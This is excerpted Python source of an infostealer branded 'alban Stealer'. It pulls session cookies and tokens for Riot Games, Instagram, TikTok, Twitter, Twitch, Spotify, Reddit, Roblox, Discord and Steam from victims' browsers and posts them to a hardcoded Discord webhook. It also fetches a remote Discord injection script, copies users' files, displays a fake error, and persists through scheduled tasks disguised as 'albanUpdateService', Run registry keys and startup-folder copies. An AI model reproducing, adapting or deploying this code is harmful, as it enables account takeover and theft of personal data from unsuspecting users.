...
webhook = 'https://discordapp.com/api/webhooks/1232974991486877768/byzN68WpCWf01o2MPAMAkj8_6bPfQB0RxgbM8A55v92n78vAVC68gJglQkYKNHJeVWcS'
...
class Main:
            ...
            if os.path.isdir(ubisoft_path):
                ...
                if found_ubisoft == True:
                    ...
                    with open(os.path.join(copied_path,"How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
                        write_file.write("https://t.me/albanStealer\n==============================================\n")
    ...
    async def RiotGamesSession(self, cookie, browser:str) -> None:
        try:
            ...
            async with aiohttp.ClientSession(connector=connector) as session:
                ...
                embed_data = {
                    "title": "***alban Stealer***",
                    "description": f"***alban Riot Games Session was detected on the {browser} browser***",
                    "url" : "https://t.me/albanStealer",
                    "color": 15548997,
                    "footer": {"text": "https://t.me/albanStealer | https://github.com/quicaxd/alban-V2.0/alban-V2.0"},
                    "thumbnail": {"url": "https://i.hizliresim.com/qxnzimj.jpg"},
                    "image": {"url": "https://cdn.discordapp.com/attachments/1224005091481227366/1233232133921701979/standard2.gif?ex=662c586d&is=662b06ed&hm=fab91c59d08f4be9bb207bd99423191d08466eea627634f9d2bab3c5de04d2da&"}}
    ...
    async def InstaSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***alban Stealer***",
                "description": f"***alban Instagram Session was detected on the {browser} browser***",
                "url" : "https://t.me/albanStealer",
                "color": 15548997,
    ...
    async def TikTokSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***alban Stealer***",
                "description": f"***alban Tiktok Session was detected on the {browser} browser***",
                "url" : "https://t.me/albanStealer",
                "color": 15548997,
                
                "thumbnail": {"url": "https://i.pinimg.com/originals/44/c9/e9/44c9e904fb0e0ffc72f6c1eea3981f22.gif"},
                "image": {"url":"https://cdn.discordapp.com/attachments/1224005091481227366/1233232133921701979/standard2.gif?ex=662c586d&is=662b06ed&hm=fab91c59d08f4be9bb207bd99423191d08466eea627634f9d2bab3c5de04d2da&"}}
            fields = [
                {"name": "Username", "value": "``" + username + "``", "inline": True},
                {"name": "Email", "value": "``" + email + "``", "inline": True},
    ...
    async def TwitterSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***alban Stealer***",
                "description": f"***alban Twitter Session was detected on the {browser} browser***",
                "url" : "https://t.me/albanStealer",
                "color": 15548997,
    ...
    async def TwitchSession(self, auth_token, username, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***alban Stealer***",
                "description": f"***alban Twitch Session was detected on the {browser} browser***",
                "url" : "https://t.me/albanStealer",
                "color": 15548997,
    ...
    async def SpotifySession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***alban Stealer***",
                "description": f"***alban Spotify Session was detected on the {browser} browser***",
                "url" : "https://t.me/albanStealer",
                "color": 15548997,
    ...
    async def RedditSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***alban Stealer***",
                "description": f"***alban Reddit Session was detected on the {browser} browser***",
                "url" : "https://t.me/albanStealer",
                "color": 15548997,
    ...
    async def RobloxSession(self, cookie, browser:str) -> None:
        try:
            ...
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                ...
                embed_data = {
                    "title": "***alban Stealer***",
                    "description": f"***alban Roblox Session was detected on the {browser} browser***",
                    "url" : "https://t.me/albanStealer",
                    "color": 15548997,
                ...
                fields = [
                    ...
                    {"name": "Cookie", "value": "```diff" + str(cookie) + "```", "inline": True},]
                embed_data["fields"] = fields
                payload = {
                    "username": "alban Stealer",
                    "embeds": [embed_data]
    ...
    async def ValidateTokenAndGetInfo(self, token:str) -> None:
        try:
            ...
            if data:
                embed_data = {
                "title": "***alban Stealer***",
                "description": f"***alban Validated Discord Token Detected***",
                "url" : "https://t.me/albanStealer",
                "color": 15548997,                
                "thumbnail": {"url": ""}}
                if pp:
                    ...
                    with open(steam_paths, "r", encoding="utf-8", errors="ignore") as file:
                        ...
                        if steamid:
                            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                                ...
                                embed_data = {
                                    "title": "***alban Stealer***",
                                    "description": f"***alban Steam Session Detected***",
                                    "url" : "https://github.com/quicaxd/alban-V2.0",
                                    "color": 15548997,
    ...
    async def SendAllData(self) -> None:
        ...
        embed_data = {
            "title": "***alban Stealer***",
            "description": f"***alban Stealer Full Info***",
            "url" : "https://t.me/albanStealer",
            "color": 15548997,
...
class DiscordInjection:
    ...
    async def GetInjectionCode(self) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://raw.githubusercontent.com/justforalban/injection/main/injection.js") as response:
                    data = await response.text()
...
class StealCommonFiles:
    ...
    async def StealFiles(self) -> None:
        try:
            ...
            destination_directory = os.path.join(self.temp, "StealedFilesByalban")
...
class Startup:
    def __init__(self) -> None:
        ...
        self.ToPath:str = os.path.join(self.LocalAppData, "albanUpdateService", "alban.exe")
    ...
    async def CreatePathAndMelt(self) -> None:
        try:
            if os.path.exists(self.ToPath): # if the startup file already exist, return
                ...
                os.mkdir(self.ToPath.replace("alban.exe", "")) # Create Directory
    ...
    async def SchtaskStartup(self) -> None: # schtask method for startup
        try:
            command = await asyncio.create_subprocess_shell(
                'schtasks /query /TN "albanUpdateService"',
                shell=True,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE)
            ...
            if not stdout: # if the file not on schtasks
                if self.Privalage: # if the code running on admin privilage, execute the startup command
                    try:
                        onLogonCommand = f'schtasks /create /f /sc onlogon /rl highest /tn "albanUpdateService" /tr "{self.ToPath}"'
                        everyOneHour = f'schtasks /create /f /sc hourly /mo 1 /rl highest /tn "albanUpdateService2" /tr "{self.ToPath}"'
                    ...
                    if result > 32: # if the user give the admin req close the normal code for execute the admin priv code
                        ...
                        try:
                            command = f'schtasks /create /f /sc daily /ri 30 /tn "albanUpdateService" /tr "{self.ToPath}"'
                            ...
                            process = await asyncio.create_subprocess_shell(
                            f'schtasks /create /f /tn "albanUpdateService" /tr "{self.ToPath}" /sc daily /ri 30',
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                            shell=True)
                            await process.communicate()
    ...
    async def RegeditStartup(self) -> None: # regedit method for startup
        try:
            if not self.Privalage: # if the code not running admin privilage, copy to HKCU
                process = await asyncio.create_subprocess_shell(
                f'reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "alban Update Service" /t REG_SZ /d "{self.ToPath}" /f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
                await process.communicate()
                ...
                process = await asyncio.create_subprocess_shell(
                f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "alban Update Service" /t REG_SZ /d "{self.ToPath}" /f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
                await process.communicate()
    ...
    async def FolderStartup(self): # folder method for startup
        try:
            if self.Privalage: #if the code running admin privilage, copy to common startup path
                if os.path.isfile(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\alban.exe"):
                    print("[+] File already on startup!")
                else:
                    shutil.copy(self.CurrentFile, r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\alban.exe")
            else: #if the code not running admin privilage, copy to normal startup path
                if os.path.isfile(os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "alban.exe")):
                    print("[+] File already on startup!")
                else:
                    shutil.copy(self.CurrentFile, os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "alban.exe"))
        except Exception as e:
            print(str(e))
...
async def Fakerror() -> None:
    try:
        if FakeError[0] and not os.path.abspath(sys.argv[0]) == os.path.join(os.getenv("LOCALAPPDATA"), "albanUpdateService", "alban.exe"):
...
if __name__ == '__main__':
    if os.name == "nt":
        if not SubModules.create_mutex("alban | Stealar | on top |"):
        ...
        print("just Windows Operating system's supported by alban")
